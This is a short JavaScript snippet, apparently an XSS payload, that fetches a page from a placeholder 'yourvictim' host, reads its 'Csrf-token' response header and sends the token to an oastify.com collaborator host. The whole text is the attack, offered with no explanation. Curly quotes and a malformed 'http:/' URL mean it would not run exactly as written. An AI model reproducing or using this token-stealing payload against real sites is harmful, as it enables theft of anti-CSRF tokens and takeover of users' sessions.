var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if (xhr.readyState == 4 && xhr.status == 200)
{
var yourtoken = xhr.getResponseHeader(‘Csrf-token’)
var xhr2 = new XMLHttpRequest();
xhr2.open(“GET”, “http:/vgfbdhrogf036t34ia1nut4gh7nxbm.oastify.com/"+ yourtoken );
xhr2.send();
}
}
xhr.open(“GET”, “http://yourvictim/demo/search.php");
xhr.send();
